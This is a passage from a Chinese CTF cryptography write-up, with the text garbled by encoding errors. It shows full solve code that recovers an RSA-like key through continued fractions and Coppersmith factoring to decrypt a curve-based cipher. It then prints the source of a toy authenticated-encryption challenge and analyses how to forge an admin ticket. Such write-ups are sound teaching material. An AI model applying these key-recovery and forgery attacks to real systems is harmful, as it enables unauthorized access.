+ 1) * 3 * (p + q) - (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))), int(((p + 1) * (q + 1) * 3 * (p + q) + (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))) ) å³$\\frac{((p+1) * (q+1) * 3 * (p+q)-(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}\u0026lt;e\u0026lt;\\frac{((p+1) * (q+1) * 3 * (p+q)+(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}$\nå³$ex-(p+1) * (q+1) * y\u0026lt;\\frac{|(p-q) * N^{0.21}|}{3(p+q)} * y$\nè¿™ä¸ªèŒƒå›´ä¸paperä¸­ç»™å®šçš„$|z|\u0026lt;\\frac{|p-q|}{3(p+q)}N^{\\frac{1}{4}}y$å¾ˆç±»ä¼¼äº†ï¼Œå°±æ˜¯paperé‡Œå¤´æ˜¯ç”¨çš„$\\phi(N)$ï¼Œè€Œé¢˜ç›®ç”¨çš„æ˜¯(p+1)(q+1)ï¼Œä½†é—®é¢˜ä¸å¤§\n$ex-(p+1) * (q+1) * y = z$\n$ex - y(N + 1 + p + q) = z$\n$\\frac{ex}{y}-N-p-q-1 = \\frac{z}{y}$\n$\\frac{ex}{y}-N-1 - \\frac{z}{y} = p + q$\nç®—ä¸€ä¸‹$\\frac{z}{y}$å³$\\frac{|p-q|}{3(p+q)}N^{0.21}$çš„å¤§å°ï¼Œçº¦ä¸º2048 * 0.21 = 430bit\nç°åœ¨å§‘ä¸”æˆ‘ä»¬æŠŠ$T = \\frac{ex}{y}-N-1$çœ‹ä½œæ˜¯p+qï¼Œç„¶åè®¡ç®—$\\rho = \\frac{T+\\sqrt{T^2 -4N}}{2}$ï¼Œ$\\rho$ä½œä¸ºpçš„ä¸€ä¸ªè¿‘ä¼¼ï¼Œå…¶ä¸­å¤§çº¦ä½430bitæ˜¯ä¸å‡†ç¡®çš„ã€‚\nè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦ç”¨åˆ°RSAå¯†ç ç³»ç»Ÿä¸­ç”¨åˆ°è¿‡çš„\rFactoring with high bits knownï¼Œ\nimage-20201102192520897\næ˜¾ç„¶è¿™é‡Œæœ‰430bitçš„ä¸ç¡®å®šä½æ•°æ˜¯æ»¡è¶³è¿™ä¸ªå…³ç³»çš„ï¼Œäºæ˜¯åˆ©ç”¨è¿™ä¸ªç®—æ³•æˆ‘ä»¬æœ€ç»ˆèƒ½æˆåŠŸçš„åˆ†è§£å‡ºpï¼Œqæ¥\nç„¶åå°±èƒ½ç®—å‡ºè¿™ä¸ªç§é’¥äº†ã€‚\næœ‰äº†ç§é’¥äº†ï¼Œè¿™ä¸ªæ›²çº¿æ€ä¹ˆç®—å‘¢ï¼Ÿ\nd = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N # 2000 years later...:) for _ in range(e): ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) è¿™é‡Œæœ‰ä¸ªç³»æ•°dï¼Œé¦–å…ˆè¦è®¡ç®—å‡ºè¿™ä¸ªç³»æ•°d\nè¿™ä¸ªç³»æ•°dçš„è®¡ç®—è¦åˆ©ç”¨åˆ°é¢˜ç›®ç»™çš„ctï¼Œ\né¦–å…ˆçœ‹åˆ°æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„å®šä¹‰å¼\nimage-20201102193536643\né’ˆå¯¹è¿™ä¸€æ¡æ›²çº¿çš„åŠ æ³•å…¬å¼æ˜¯\nimage-20201102193604325\né’ˆå¯¹è¿™ä¸€é“é¢˜ä»–ä»£ç é‡Œçš„é‚£ä¸ªåŠ æ³•å¼å­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¿™é‡Œç›¸å½“äºæ˜¯æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„ç³»æ•°a = -d\né‚£ä¹ˆå†é…ä¸Šä¸€ä¸ªåæ ‡(x,y)ï¼Œæˆ‘ä»¬å°±èƒ½è®¡ç®—å‡ºç³»æ•°däº†ã€‚\nå…¶å®è¿™é‡Œå¯ä»¥åšä¸€ä¸ªæ€è€ƒï¼Œè¿™ä¸ªç³»æ•°dæ˜¯æœ‰å•¥ç”¨ï¼Ÿ\næˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæºç é‡Œè¿™ä¸ªç³»æ•°dçš„ç”Ÿæˆä»£ç d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N\nè¿™é‡Œpt[0],pt[1]æ˜¯flagæ˜æ–‡å‰åä¸¤æ®µçš„åè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œæ‰€ä»¥dæ˜¯ç”±flagæ˜æ–‡å†³å®šçš„ã€‚\næˆ‘ä»¬å†å˜æ¢ä¸Šè¿°æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„æ–¹ç¨‹ï¼š\n$ax^2 + y^2 = 1 + dx^2y^2$\n$dx^2y^2+dx^2=y^2 - 1$\n$d(x^2(y^2+1))=y^2 - 1$\n$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$\nå¯ä»¥å‘ç°å°±æ˜¯è¿™ä¸ªç”Ÿæˆä»£ç çš„æ–¹ç¨‹å¼ï¼Œpt[1]ä»£è¡¨yï¼Œpt[0]ä»£è¡¨x\næ‰€ä»¥å…¶å®è¿™ä¸ªç³»æ•°dçš„ä½œç”¨å°±æ˜¯ä¿è¯flagæ‰€ä»£è¡¨çš„ç‚¹åœ¨è¿™æ¡æ›²çº¿ä¸Šã€‚\nå¥½äº†ï¼Œç³»æ•°dä¹Ÿç®—å‡ºæ¥äº†ï¼Œæ€ä¹ˆåˆ©ç”¨ç§é’¥æ¥è§£å¯†å‘¢ï¼Ÿ\næ˜¾ç„¶ä¸å¯èƒ½ç›´æ¥åˆ©ç”¨åŸæ¥é‡Œçš„è¿™ä¸ªå¾ªç¯å»åŠ ä¸Šè¿™äº›ç‚¹ï¼Œ\nä¿¡å®‰æ•°åŸºä¸­å°±æåˆ°è¿‡çš„é‡å¤å€åŠ ç®—æ³•äº†è§£ä¸€ä¸‹å’¯~\nè§£é¢˜æµç¨‹ # æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼š\nåˆ©ç”¨è¿åˆ†æ•°å¾—åˆ°xï¼Œyï¼ˆè‡³äºæ€ä¹ˆç¡®å®šxï¼Œy. å¯ä»¥æ ¹æ®å¾—åˆ°çš„xï¼Œyçš„bitä½æ•°ï¼Œæˆ–è€…ç”¨xï¼Œyè®¡ç®—å‡ºæ¥çš„Tçš„bitä½æ•°æ¥åˆ¤æ–­ï¼‰ åˆ©ç”¨Factoring with high bits known åˆ†è§£å‡ºpï¼Œq è®¡ç®—ç§é’¥ prikey = inverse(e , (p+1) * (q+1)) è®¡ç®—ç³»æ•°$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$ åˆ©ç”¨é‡å¤å€åŠ ç®—æ³•åšä¸€ä¸ªä¹˜æ³•è®¡ç®— mt = d * ct exp\ne,N=(,) c = continued_fraction(e/N) for i in range(len(c)): y=c.numerator(i) x=c.denominator(i) if y == 0: continue T = e*x//y-N-1 if 1023\u0026lt;(int(T).bit_length()) \u0026lt; 1026:\t#æ ¹æ®Tçš„bitä½æ•°æ¥ç¡®å®šx,y print(T) print(x,int(x).bit_length()) print(y,int(y).bit_length()) break from gmpy2 import *\t#Factoring with high bits known _p = (T+iroot(T^2-4*N,int(2))[0])//2 p = int(_p) n=N kbits = 430 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + p x0 = f.small_roots(X=2^kbits, beta=0.4)[0] p = p+x0 print(\u0026#34;p: \u0026#34;, p) assert n % p == 0 q = n/int(p) print(\u0026#34;q: \u0026#34;, q) x,y=(,) #-d*x*^2 +y^2 = 1+d*x^2*y^2 d = (1-y^2)*inverse_mod(-x^2*y^2-x^2,N)%N\t#è®¡ç®—ç³»æ•°d e_inv = inverse_mod(int(e),int((int(p)+1)*(int(q)+1)))\t#è®¡ç®—ç§é’¥prikey def add(ct,pt):\t#é‡å¤å€åŠ ç®—æ³•çš„å®ç° ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) return ct def mul_by_double_adding(ct,n): pt = (0, 1) while n \u0026gt; 0: if n % 2 == 1: pt = add(ct, pt) ct = add(ct, ct) n = n\u0026gt;\u0026gt;1 return pt\t(x,y)=mul_by_double_adding((x,y),e_inv)\t#è·å–mtï¼Œå¾—åˆ°flag from Crypto.Util.number import long_to_bytes print(long_to_bytes(x)+long_to_bytes(y)) imposter # Toy_AE.py\nimport os from Crypto.Cipher import AES from Crypto.Util.strxor import strxor from Crypto.Util.number import long_to_bytes, bytes_to_long class Toy_AE(): def __init__(self): self.block_size = 16 self.n_size = self.block_size self.delta = b\u0026#39;\\x00\u0026#39; * self.block_size self.init_cipher() def init_cipher(self): key = os.urandom(16) self.cipher = AES.new(key = key, mode = AES.MODE_ECB) def pad(self, m, block_size): return m if len(m) == block_size else (m + b\u0026#39;\\x80\u0026#39; + (b\u0026#39;\\x00\u0026#39; * (block_size - 1 - len(m)))) def GF2_mul(self, a, b, n_size): s = 0 for bit in bin(a)[2:]: s = s \u0026lt;\u0026lt; 1 if bit == \u0026#39;1\u0026#39;: s ^= b upper = bytes_to_long(long_to_bytes(s)[:-n_size]) lower = bytes_to_long(long_to_bytes(s)[-n_size:]) return upper ^ lower def encrypt(self, msg): return self.A_EF(msg) def decrypt(self, ct, _te): msg, te = self.A_DF(ct) return msg if _te == te else None def A_EF(self, msg): self.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.L = self.cipher.encrypt(b\u0026#39;ConvenienceFixed\u0026#39;) self.delta = b\u0026#39;DeltaConvenience\u0026#39; m = len(msg) // self.n_size m += 1 if (len(msg) % self.n_size) else 0 M_list = [msg[i * self.n_size : (i + 1) * self.n_size] for i in range(m)] C_list = [] for i in range(0, (m-1)//2): C1, C2 = self.feistel_enc_2r(M_list[2*i], M_list[2*i +1]) C_list.append(C1) C_list.append(C2) self.Sigma = strxor(M_list[2*i +1], self.Sigma) self.L = long_to_bytes(self.GF2_mul(2, bytes_to_long(self.L), self.n_size)) if m \u0026amp; 1 == 0: Z = self.cipher.encrypt(strxor(self.L, M_list[-2])) Cm = strxor(Z[:len(M_list[-1])], M_list[-1]) Cm_1 = strxor(self.cipher.encrypt(strxor(strxor(self.L, self.delta), self.pad(Cm, self.block_size))), M_list[-2]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(Cm, self.block_size))) self.L = strxor(self.L, self.delta) C_list.append(Cm_1) C_list.append(Cm) else: Cm = strxor(self.cipher.encrypt(self.L)[:len(M_list[-1])], M_list[-1]) self.Sigma = strxor(self.Sigma, self.pad(M_list[-1], self.n_size)) C_list.append(Cm) if len(M_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) return b\u0026#39;\u0026#39;.join(C_list), TE def A_DF(self, ct): self.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.L = self.cipher.encrypt(b\u0026#39;ConvenienceFixed\u0026#39;) self.delta = b\u0026#39;DeltaConvenience\u0026#39; m = len(ct) // self.n_size m += 1 if (len(ct) % self.n_size) else 0 C_list = [ct[i * self.n_size : (i + 1) * self.n_size] for i in range(m)] M_list = [] for i in range(0, (m-1) // 2): M1, M2 = self.feistel_dec_2r(C_list[2*i], C_list[2*i +1]) self.Sigma = strxor(M2 ,self.Sigma) self.L = long_to_bytes(self.GF2_mul(2, bytes_to_long(self.L), self.n_size)) M_list.append(M1) M_list.append(M2) if m \u0026amp; 1 == 0: Mm_1 = strxor(self.cipher.encrypt(strxor(strxor(self.L, self.delta), self.pad(C_list[-1], self.block_size))), C_list[-2]) Z = self.cipher.encrypt(strxor(self.L, Mm_1)) Mm = strxor(Z[:len(C_list[-1])], C_list[-1]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(C_list[-1], self.block_size))) self.L = strxor(self.L, self.delta) M_list.append(Mm_1) M_list.append(Mm) else: Mm = strxor(self.cipher.encrypt(self.L)[:len(C_list[-1])], C_list[-1]) self.Sigma = strxor(self.Sigma, self.pad(Mm, self.block_size)) M_list.append(Mm) if len(C_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) return b\u0026#39;\u0026#39;.join(M_list), TE def feistel_enc_2r(self, M1, M2): C1 = strxor(self.cipher.encrypt(strxor(M1, self.L)), M2) C2 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), M1) return C1, C2 def feistel_dec_2r(self, C1, C2): M1 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), C2) M2 = strxor(self.cipher.encrypt(strxor(M1, self.L)), C1) return M1, M2 task.py\n#!/usr/bin/env python3 import os import random import string from hashlib import sha256 from Toy_AE import Toy_AE from secret import FLAG def proof_of_work(): random.seed(os.urandom(8)) proof = b\u0026#39;\u0026#39;.join([random.choice(string.ascii_letters + string.digits).encode() for _ in range(20)]) digest = sha256(proof).hexdigest().encode() print(\u0026#34;sha256(XXXX+%s) == %s\u0026#34; % (proof[4:],digest)) print(\u0026#34;Give me XXXX:\u0026#34;) x = input().encode() return False if len(x) != 4 or sha256(x + proof[4:]).hexdigest().encode() != digest else True def pack(uid, uname, token, cmd, appendix): r = b\u0026#39;\u0026#39; r += b\u0026#39;Uid=%d\\xff\u0026#39; % uid r += b\u0026#39;UserName=%s\\xff\u0026#39; % uname r += b\u0026#39;T=%s\\xff\u0026#39; % token r += b\u0026#39;Cmd=%s\\xff\u0026#39; % cmd r += appendix return r def unpack(r): data = r.split(b\u0026#34;\\xff\u0026#34;) uid, uname, token, cmd, appendix = int(data[0][4:]), data[1][9:], data[2][2:], data[3][4:], data[4] return (uid, uname, token, cmd, appendix) def apply_ticket(): uid = int(input(\u0026#34;Set up your user id:\u0026#34;)[:5]) uname = input(\u0026#34;Your username:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if uname == b\u0026#34;Administrator\u0026#34;: print(\u0026#34;Sorry, preserved username.\u0026#34;) return token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) cmd = input(\u0026#34;Your command:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(\u0026#34;Not allowed!\u0026#34;) return appendix = input(\u0026#34;Any Appendix?\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] msg = pack(uid, uname, token, cmd, appendix) ct, te = ae.encrypt(msg) print(\u0026#34;Your ticket:%s\u0026#34; % ct.hex()) print(\u0026#34;With my Auth:%s\u0026#34; % te.hex()) def check_ticket(): ct = bytes.fromhex(input(\u0026#34;Ticket:\u0026#34;)) te = bytes.fromhex(input(\u0026#34;Auth:\u0026#34;)) msg = ae.decrypt(ct, te) assert msg uid, uname, token, cmd, appendix = unpack(msg) if uname == b\u0026#34;Administrator\u0026#34; and cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(FLAG) exit(0) else: print(\u0026#34;Nothing happend.\u0026#34;) def menu(): print(\u0026#34;Menu:\u0026#34;) print(\u0026#34;[1] Apply Ticket\u0026#34;) print(\u0026#34;[2] Check Ticket\u0026#34;) print(\u0026#34;[3] Exit\u0026#34;) op = int(input(\u0026#34;Your option:\u0026#34;)) assert op in range(1, 4) if op == 1: apply_ticket() elif op == 2: check_ticket() else: print(\u0026#34;Bye!\u0026#34;) exit(0) if __name__ == \u0026#34;__main__\u0026#34;: ae = Toy_AE() if not proof_of_work(): exit(-1) for _ in range(4): try: menu() except: exit(-1) å¯æ¶ï¼Œæœç„¶æ˜¯è¿™æ ·å—ã€‚ã€‚ä¸åªä»£ç é•¿ï¼Œç”šè‡³é™„ä»¶éƒ½æœ‰ä¿©ã€‚å®³ï¼Œæ…¢æ…¢å•ƒå’¯ã€‚ã€‚ã€‚å…ˆä¸ç®¡è¿™ä¸ªåŠ å¯†çš„å…·ä½“æ˜¯å•¥ï¼Œæ¥çœ‹çœ‹åŠŸèƒ½æ˜¯å•¥å­ã€‚ç¨‹åºæœ‰ä¿©åŠŸèƒ½ï¼Œæä¾›ticketï¼Œå’Œæ£€æŸ¥ticketï¼Œè·å–flagçš„ç‚¹åœ¨æ£€æŸ¥ticketï¼Œ\ndef decrypt(self, ct, _te): msg, te = self.A_DF(ct) return msg if _te == te else None msg = ae.decrypt(ct, te) assert msg uid, uname, token, cmd, appendix = unpack(msg) if uname == b\u0026#34;Administrator\u0026#34; and cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(FLAG) è¦æ±‚ä½ çš„è¿™ä¸ªticketä»£è¡¨çš„ä¿¡æ¯æ˜¯ï¼Œç”¨æˆ·åæ˜¯Administratorï¼Œè¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯Give_Me_Flagï¼Œå¹¶ä¸”è¿˜è¦æä¾›è¿™ä¸ªticketçš„ç­¾åAuthæ¥ä¿è¯ä»–çš„åˆæ³•æ€§ã€‚\nå†æ¥çœ‹çœ‹è¿™ä¸ªæä¾›ticketæœ‰å•¥ï¼Œ\ndef apply_ticket(): uid = int(input(\u0026#34;Set up your user id:\u0026#34;)[:5]) uname = input(\u0026#34;Your username:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if uname == b\u0026#34;Administrator\u0026#34;: print(\u0026#34;Sorry, preserved username.\u0026#34;) #return token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) cmd = input(\u0026#34;Your command:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(\u0026#34;Not allowed!\u0026#34;) #return appendix = input(\u0026#34;Any Appendix?\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] msg = pack(uid, uname, token, cmd, appendix) ä»–è¦æ±‚ä½ æä¾›ï¼Œuidï¼Œç”¨æˆ·åï¼Œcmdï¼Œå’Œé¢å¤–çš„å¯é€‰æ‹©çš„ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œç”¨æˆ·åä¸èƒ½ç­‰äºAdministratorï¼Œcmdä¸èƒ½ç­‰äºGive_Me_Flagã€‚ï¼ˆä¸ç„¶è¿™é¢˜ç›´æ¥å°±æ²¡äº†ã€‚ï¼‰ç„¶åä»–ä¼šç”Ÿæˆä¸€ä¸ªä½ çš„ç”¨æˆ·åçš„sha256çš„æ‘˜è¦ï¼Œè‡³äºå­˜å¤šå°‘é•¿è¯»è¿›ä½ çš„messageå‘¢ï¼Œç”±ä½ çš„uidæ¥å†³å®šã€‚\ntoken = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) ç„¶åä¸€äº›é™åˆ¶æ˜¯ï¼Œé™¤äº†uidæœ€å¤§ä¸º5ä½æ•°å­—ä¹‹å¤–ï¼Œå…¶ä½™è¾“å…¥æœ€å¤šåªèƒ½16ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”æ¯ä¸ªå­—ç¬¦çš„asciiéƒ½å¾—åœ¨0-128ä¹‹é—´ï¼ˆç”±decode(â€˜asciiâ€™)é™åˆ¶ï¼‰ã€‚ï¼ˆä¸ç„¶ä½ è¦æ˜¯è¾“å…¥\\xffï¼Œè¿™é¢˜ä¹Ÿç›´æ¥å°±æ²¡äº†ï¼‰\næ‰€ä»¥é¢˜ç›®æ„æ€å¾ˆæ˜ç¡®ï¼Œä½ è¦ä¼ªé€ å¯†æ–‡ï¼Œå¹¶ä¸”è¿˜è¦èƒ½å¤Ÿæ„é€ å¯¹åº”çš„ç­¾åæ¥é€šè¿‡åˆæ³•æ€§éªŒè¯ã€‚è®©ä»–è§£å¯†ä¿¡æ¯åç”¨æˆ·åä¸ºAdministratorï¼Œcmdä¸ºGive_Me_Flagã€‚ç„¶åç”±äºå¯¹è¾“å…¥åšçš„è¯¸å¤šé™åˆ¶ï¼Œï¼ˆç”šè‡³ä¸€æ¬¡è¿æ¥åªèƒ½äº¤äº’4æ¬¡ï¼Œé™¤å»ä¸€æ¬¡æ¥è·å–flagï¼Œåªèƒ½äº¤äº’ä¸‰æ¬¡ï¼Œä¸‹ä¸€æ¬¡è¿æ¥å°±ç”Ÿæˆæ–°çš„Toy_AEå¯¹è±¡ï¼Œç”Ÿæˆæ–°çš„keyäº†ï¼‰å¯¼è‡´æ¼æ´ç‚¹å¤§æ¦‚ç‡ä¸ä¼šå‡ºç°åœ¨è¿™ä¸ªtaskæ–‡ä»¶ä¸­ï¼Œï¼Œé‚£å°±è¦æ‰¾è¿™ä¸ªToy_AEç®—æ³•çš„æ´äº†ã€‚ï¼ˆå•Šï¼Œå¥½é•¿ï¼Œä¸æƒ³çœ‹ï¼‰\nä¸€ç‚¹ç‚¹å•ƒå­ï¼Œå…ˆå¤§è‡´éšä¾¿çœ‹çœ‹ï¼Œç„¶åæˆ‘ä»¬æœ‰ç›®çš„æ€§çš„å…ˆæ¥çœ‹çœ‹ç”ŸæˆAuthçš„è¿‡ç¨‹ã€‚ï¼ˆå•ç‹¬æ‹å‡ºæ¥ä¼šæ¸…æ™°äº›ï¼‰\nself.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.Sigma = strxor(M_list[2*i +1], self.Sigma) if ç»„æ•°ä¸ºå¶æ•°ï¼š Z = self.cipher.encrypt(strxor(self.L, M_list[-2])) Cm = strxor(Z[:len(M_list[-1])], M_list[-1]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(Cm, self.block_size))) else: self.Sigma = strxor(self.Sigma, self.pad(M_list[-1], self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœç»„æ•°ä¸ºå¶æ•°ï¼Œå°±ä¼šå¤šç”Ÿæˆä¸€ä¸ªZï¼Œè€Œä¸”ç”Ÿæˆçš„å¯†æ–‡æ–¹å¼ä¹Ÿä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆåˆ©ç”¨é‚£ä¸ªé™„åŠ ä¿¡æ¯æ¥æ§åˆ¶ç»„æ•°ï¼Œå°½é‡é¿å…è¿™ä¸ªéº»çƒ¦çš„ä¸œè¥¿ã€‚\nè¿™æ ·å­çš„è¯Sigmaç¬¬2å—ã€ç¬¬4å—æ˜æ–‡ã€å¡«å……åçš„ç¬¬5å—æ˜æ–‡çš„å¼‚æˆ–ï¼Œç„¶åå’Œmulter\nif len(M_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) ï¼ˆmulterå’ŒLæœ‰å…³ï¼Œä¸å¯çŸ¥ï¼Œé‚£å°±ä¸ç®¡äº†ï¼‰å¼‚æˆ–ï¼Œæœ€åAESåŠ å¯†ï¼Œè¿”å›å¯†æ–‡ã€‚\nç”±äºAESçš„keyä¹Ÿä¸å¯çŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‹¿åˆ°Authï¼Œæ²¡åˆ«çš„æ–¹æ³•äº†ã€‚åªèƒ½åœ¨ä¼ æ˜æ–‡è·å–Authæ—¶ï¼Œè®©æˆ‘ä»¬çš„msgçš„ç¬¬äºŒå—å’Œç¬¬å››å—å’Œç¬¬äº”å—å’ŒçœŸæ­£çš„èƒ½æ‹¿åˆ°FLAGçš„msgçš„æ˜æ–‡ä¿æŒä¸€è‡´äº†ã€‚\nè¿™é‡Œä¸€ä¸ªåšæ³•å°±æ˜¯ï¼Œæœ¬åœ°è·‘è¿™ä¸ªç¨‹åºï¼ŒæŠŠé‚£äº›éº»çƒ¦çš„PoWå•¥çš„å»å»æ‰ï¼Œä¸€äº›é™åˆ¶ï¼ˆæ¯”å¦‚ç”¨æˆ·åä¸èƒ½æ˜¯Administratorï¼‰ä¹Ÿå»å»æ‰ï¼Œç„¶åæ‰“å°ä¸€äº›æ–¹ä¾¿æˆ‘ä»¬å®¡è®¡çš„ä¿¡æ¯ï¼Œï¼ˆå½“ç„¶ï¼Œç†Ÿç”¨é‚£ç§è‡ªå¸¦debugç¼–è¯‘å™¨çš„å¤§ä½¬å¯ä»¥å¿½ç•¥ï¼ŒIDLEé€‰æ‰‹è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢print debugå¤§æ³•ï¼‰\né‚£å°±æ˜¯æ€ä¹ˆä¼ªé€ å¯†æ–‡äº†ã€‚\nå…ˆçœ‹çœ‹å¯†æ–‡çš„ç”Ÿæˆ\nC1, C2 = self.feistel_enc_2r(M_list[2*i], M_list[2*i +1]) def feistel_enc_2r(self, M1, M2): C1 = strxor(self.cipher.encrypt(strxor(M1, self.L)), M2) C2 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), M1) return C1, C2 æˆ‘ä»¬æŠŠæ˜æ–‡å’Œå¯†æ–‡çœ‹æˆ16å­—èŠ‚ä¸€å—ï¼Œä¸¤å—ä¸€ç»„ï¼Œä¸¤å—æ˜æ–‡å¯¹è‡ªå·±è¿™ç»„ç”Ÿæˆçš„å¯†æ–‡æœ‰å½±å“ï¼Œä½†æ¯ç»„æ˜æ–‡é—´çš„åŠ å¯†æ˜¯ç‹¬ç«‹çš„ã€‚ä¹Ÿå°±æ˜¯ç¬¬ä¸€ç»„ï¼ˆç¬¬ä¸€äºŒå—ï¼‰æ˜æ–‡ä¸å½±å“ç¬¬äºŒç»„ï¼ˆç¬¬ä¸‰å››å—ï¼‰æ˜æ–‡ç”Ÿæˆçš„ç¬¬äºŒå—å¯†æ–‡ã€‚\né‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çš„uidæ˜¯1ï¼Œç”¨æˆ·åæ˜¯Administratorï¼Œcmdæ˜¯Give_Me_Flagï¼Œä¸åŠ ä¿¡æ¯ï¼Œ\nï¼ˆæœ¬åœ°èµ·è¿™ä¸ªç¨‹åºï¼ŒæŠŠç”¨æˆ·åå’Œcmdçš„é™åˆ¶ç»™å–æ¶ˆæ‰ï¼Œç„¶åæ‰“å°ä¸€ä¸‹M_listï¼‰\nimage-20201102204318891\næˆ‘ä»¬ä¼šç”Ÿæˆ4å—æ˜æ–‡ï¼Œ[b'Uid=1\\xffUserName=A', b'dministrator\\xffT=e', b'7d3e769\\xffCmd=Give', b'_Me_Flag\\xff']\nå‰é¢è¯´äº†ï¼Œä¸ºäº†è®©ç”Ÿæˆçš„Authä¾¿äºè®¡ç®—ï¼Œæˆ‘ä»¬è¦åŠ å…¥é™„åŠ ä¿¡æ¯ï¼ˆAppendixï¼‰æ¥æ§åˆ¶æ˜æ–‡ç»„æ•°ã€‚\nä½†è¿™é‡Œå…ˆçœ‹çœ‹M_listå­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å¾—åˆ°Authï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—ä¿è¯æˆ‘ä»¬æ„é€ çš„ç”¨æˆ·åå’Œcmdåœ¨ä¸ç­‰äºé™å®šå€¼çš„æƒ…å†µä¸‹ï¼ŒM_listçš„ç¬¬äºŒç»„å’Œç¬¬å››ç»„ä¸ç”¨æˆ·åä¸ºAdministratorå’Œcmdä¸ºGive_Me_Flagæ—¶çš„M_listçš„ç›¸åº”åˆ†ç»„ç›¸åŒã€‚\nè¿™æ ·å­çœ‹è¿‡å»ï¼Œå¯¹äºæˆ‘ä»¬ç›®å‰å¾—åˆ°çš„è¿™ä¸ªM_listæ˜¯å¾ˆå¥½æ„é€ çš„ï¼Œç”±äºAdministratorçš„Aåœ¨ç¬¬ä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†ŒBdministratorï¼›ç”±äºGive_Me_Flagçš„Giveåœ¨ç¬¬ä¸‰ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œgive_Me_Flagå°±å¥½äº†ã€‚ç„¶ååŠ ä¸€åŠ Appendixæ§åˆ¶ä¸‹ç»„æ•°ã€‚ä½†æ˜¯æ³¨æ„åˆ°ç¬¬äºŒç»„æœ€åä¸€ä½æ˜¯sha256çš„é¦–ä½ï¼Œè€Œæˆ‘ä»¬è¦æ˜¯åŠ¨äº†ç”¨æˆ·åï¼Œè¿™ä¸ªå€¼å¤§æ¦‚ç‡ä¹Ÿæœ‰å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—æ§åˆ¶è¿™ä¸ªç”¨æˆ·åçš„é¦–ä½ï¼Œå¯èƒ½ä¸èƒ½æ˜¯Bï¼Œæˆ‘ä»¬å°±åœ¨ascii 